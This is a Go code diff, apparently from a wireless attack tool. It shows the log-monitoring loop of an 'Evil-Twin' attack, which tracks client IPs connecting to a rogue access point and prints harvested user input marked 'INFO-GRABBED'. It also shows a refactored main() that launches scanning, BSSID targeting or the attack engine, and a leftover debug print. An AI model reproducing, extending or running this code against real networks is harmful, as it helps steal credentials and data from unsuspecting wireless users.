+							var infograbtype string
+							if logfileindex == 2 {
+								var clientIp string = strings.Split(textlog, " ")[0]
+								infograbtype = color.Null + colo.New(colo.BgGreen).Sprint("CLIENT")
+								if len(strings.Split(textlog, "\" 200 ")) > 1 {
+									if lenlog, err := strconv.Atoi(strings.Split(strings.Split(textlog, "\" 200 ")[1], " \"")[0]); err == nil && lenlog != 483 && slices.Contains(ClientsIPDetected, clientIp) {
+										ftextlog, _ := strings.CutSuffix(strings.Split(textlog, "\" \"")[1], "\"")
+										textlog = fmt.Sprintf("%s%s -> ACTION | INFO: %s", color.White, clientIp, ftextlog)
+										ClientsIPDetected = append(ClientsIPDetected, clientIp)
+									}
+								}
+								if !slices.Contains(ClientsIPDetected, clientIp) && !strings.Contains(textlog, "ACTION") {
+									textlog = fmt.Sprintf("%s%s -> CONNECTED", color.White, clientIp)
+									ClientsIPDetected = append(ClientsIPDetected, clientIp)
+								} else if strings.Contains(textlog, "ACTION") {
+								} else {
+									loglines[logfileindex]++
+									continue
+								}
+							} else {
+								infograbtype = colo.New(colo.BgGreen).Sprint("USER-INPUT")
+							}
+							fmt.Printf("%s[%s%s%s] [%s%s%s] [%s%s] %s\n", color.White, color.Yellow, time.Now().Format("15:04:05"), color.White, color.Blue, colo.New(colo.FgBlue).Sprint("INFO-GRABBED"), color.White, infograbtype, color.White, textlog)
+						} else {
+							libs.CustomLog(color, color.Blue, logFilesTitle[logfileindex], textlog)
+						}
+						if strings.Contains(textlog, "deinit") && panicExit {
+							fmt.Printf("%s[%s%s%s] [%sLOG%s] Reset configurations & quitting services ... ", color.White, color.Yellow, time.Now().Format("15:04:05"), color.White, color.Blue, color.White)
+							eviltwinQuit = true
+							return
+						}
+						loglines[logfileindex]++
+					}
+				}
+			}
+			time.Sleep(50 * time.Millisecond)
+		}
+	}
+	libs.SignalError(color, "Unknown error can't run correctly Evil-Twin attack.")
+}
 
 func main() {
-	ChannelList, file, nameiface, prefix, disableInactiver, loaderFile, loadScan, onlyBeacon, scbssid := collect()
-	if scbssid != "?" {
-		rssiradar = true
-		deepScanning(ChannelList, nameiface, setup("?", nameiface, false, ""), scbssid)
-	} else if loaderFile == "?" {
-		engine(nameiface, setup(file, nameiface, false, ""), ChannelList, prefix, disableInactiver, onlyBeacon)
-	} else if libs.ReaderCheck(loaderFile) {
-		if loadScan {
-			engine(nameiface, setup(file, nameiface, true, loaderFile), ChannelList, prefix, disableInactiver, onlyBeacon)
+	if runtime.GOOS != "linux" {
+		fmt.Println("Invalid operative system: needed GNU/Linux")
+		os.Exit(1)
+	}
+	prefix, channelList, pcapWriteFile, fileLoader, scanAfterLoad, scBSSID := collect()
+	fmt.Println("DDD")
+	if scBSSID != "?" {
+		rssiRadar = true
+		setup("?", false, "")
+		deepScanning(channelList, scBSSID)
+	} else if fileLoader == "?" {
+		setup(pcapWriteFile, false, "")
+		engine(channelList, prefix)
+	} else if libs.ReaderCheck(fileLoader) {
+		if scanAfterLoad {
+			setup(pcapWriteFile, true, fileLoader)
+			engine(channelList, prefix)
 		} else {
-			loaderSetupView(loaderFile)
+			loaderSetupView(fileLoader)
 			printChart(true)
 		}
 	}
